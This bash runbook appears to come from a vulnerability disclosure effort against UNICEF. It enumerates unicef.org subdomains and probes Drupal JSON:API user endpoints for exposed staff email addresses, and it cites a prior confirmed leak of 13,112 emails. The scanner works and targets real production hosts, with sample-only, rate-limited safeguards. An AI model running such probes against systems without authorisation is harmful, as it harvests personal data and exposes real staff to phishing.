#!/usr/bin/env bash
# =============================================================================
# UNICEF VDP — Drupal JSON:API user-EMAIL exposure sweep (session6)
# Portable: Linux / Pi / Termux.
#
# F001 (CONFIRMED, submitted): ram.unicef.org /en/jsonapi/user/user leaks 13,112
# staff emails. The other Drupal instances were marked 403/301 — but on /jsonapi
# WITHOUT the /en/ prefix. ram needed /en/. So re-test EVERY Drupal host for the
# same email leak across path/language variants. Any hit = a confirmed valid
# finding (same accepted class as F001), per-host or systemic.
#
# SAFETY: read-only GET, >=1.2 req/sec, SAMPLE ONLY (page-size 1 to CONFIRM the
# leak + read total from meta — never bulk-pull). NO password-reset/registration
# POSTs (would email real users). HARD STOP + flag on beneficiary/child/health
# data. We report the misconfiguration with a minimal redacted sample.
#
# Run (Termux): OUTDIR=$HOME/un6 bash runbooks/PI-RUNBOOK-unicef-session6-drupal-email-sweep.sh \
#                 2>&1 | tee $HOME/un6/un6.log
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/un6
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/un6"
  else OUTDIR="$HOME/un6"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
PACE="${PACE:-1.2}"
SENS='beneficiar|child_|date_of_birth|"dob"|patient|diagnos|refugee|gbv|national_id|passport|"ssn"'
echo "============================================================"
echo "UNICEF DRUPAL EMAIL SWEEP  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "pace: ${PACE}s/req   SAFETY: sample-only, no reset POSTs, stop-on-sensitive"
echo "============================================================"; echo ""

# ── A: enumerate subdomains (crt.sh + certspotter + wayback) ──
echo "═══ A: SUBDOMAIN ENUM ═══"
: > "$OUTDIR/subs.raw"
curl -s --max-time 35 -H "User-Agent: $UA" "https://crt.sh/?q=%25.unicef.org&output=json" 2>/dev/null \
  | grep -oE '[a-zA-Z0-9._*-]+\.unicef\.org' >> "$OUTDIR/subs.raw" || true
curl -s --max-time 30 -H "User-Agent: $UA" \
  "https://api.certspotter.com/v1/issuances?domain=unicef.org&include_subdomains=true&expand=dns_names" 2>/dev/null \
  | grep -oE '[a-zA-Z0-9._-]+\.unicef\.org' >> "$OUTDIR/subs.raw" || true
curl -s --max-time 30 -H "User-Agent: $UA" \
  "http://web.archive.org/cdx/search/cdx?url=*.unicef.org&output=text&fl=original&collapse=urlkey&limit=8000" 2>/dev/null \
  | sed -E 's#https?://##; s#/.*##; s/:.*//' | grep -E '\.unicef\.org$' >> "$OUTDIR/subs.raw" || true
grep -vE '^\*|familylinks|casebook|missing|tracing|child|beneficiar|victim|gbv|protection' "$OUTDIR/subs.raw" \
  | sort -u > "$OUTDIR/subs.txt"
echo "  $(wc -l < "$OUTDIR/subs.txt") candidate hosts"
echo ""

# ── B: per-host Drupal + user-email leak test ──
echo "═══ B: DRUPAL DETECT + user/user EMAIL LEAK (path/lang variants) ═══"
: > "$OUTDIR/HITS.txt"; n=0
while read -r H; do
  [ -z "$H" ] && continue
  n=$((n+1)); [ "$n" -gt "${MAXHOSTS:-300}" ] && break
  # is it Drupal? (header or jsonapi index)
  hdr=$(curl -s -I -L --max-redirs 2 --max-time 12 -H "User-Agent: $UA" "https://$H/" 2>/dev/null)
  echo "$hdr" | grep -qiE 'x-generator: *Drupal|x-drupal-(cache|dynamic)' && isdru=1 || isdru=0
  sleep "$PACE"
  # try user/user across path + language variants (ram needed /en/)
  hit=""
  for P in "/en/jsonapi/user/user" "/jsonapi/user/user" "/fr/jsonapi/user/user" \
           "/es/jsonapi/user/user" "/ar/jsonapi/user/user"; do
    out=$(curl -s -L --max-redirs 2 --max-time 15 -H "User-Agent: $UA" \
          -H 'Accept: application/vnd.api+json' "https://$H$P?page%5Blimit%5D=1" 2>/dev/null)
    sleep "$PACE"
    if echo "$out" | grep -qiE "$SENS"; then echo "  [SENSITIVE @ $H$P] flag, no pull"; echo "$H$P SENSITIVE">>"$OUTDIR/SENSITIVE.txt"; continue; fi
    # detect an exposed email in the sample
    em=$(echo "$out" | grep -oiE '"mail":"[^"]+@[^"]+"|"display_name":"[^"]+@unicef\.org"' | head -1)
    if [ -n "$em" ]; then
      tot=$(echo "$out" | grep -oE '"total":[0-9]+|"count":[0-9]+' | head -1)
      echo "  *** EMAIL LEAK: https://$H$P  (drupal=$isdru) total=$tot"
      echo "$H|$P|$tot" >> "$OUTDIR/HITS.txt"
      echo "$out" | head -c 500 > "$OUTDIR/sample-$(echo "$H$P"|tr -c 'A-Za-z0-9' '_').json"
      hit=1; break
    fi
  done
  [ -z "$hit" ] && [ "$isdru" = 1 ] && echo "  drupal (no email leak): $H"
done < "$OUTDIR/subs.txt"
echo ""

echo "════════════════════════════════════════════"
echo "RESULTS"
echo "════════════════════════════════════════════"
if [ -s "$OUTDIR/HITS.txt" ]; then
  echo "  *** CONFIRMED EMAIL-LEAK HOSTS (F001 class, NEW if != ram.unicef.org):"
  sort -u "$OUTDIR/HITS.txt" | while IFS='|' read -r h p t; do echo "    https://$h$p   $t"; done
  echo ""
  echo "  -> ram.unicef.org = already F001 (dedup). Any OTHER host = new confirmed"
  echo "  finding. If several, file ONE systemic report listing all affected hosts."
  echo "  Confirm the sample shows real @unicef.org emails, redact, report."
else
  echo "  No other host exposed user emails this pass."
  echo "  Next: JS endpoint/secret mining + per-instance REST/views misconfig sweep."
fi
[ -s "$OUTDIR/SENSITIVE.txt" ] && { echo ""; echo "  !!! SENSITIVE (hand-review only):"; sed 's/^/    /' "$OUTDIR/SENSITIVE.txt"; }
echo ""
echo "Evidence: $OUTDIR (samples redacted, sample-only)"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
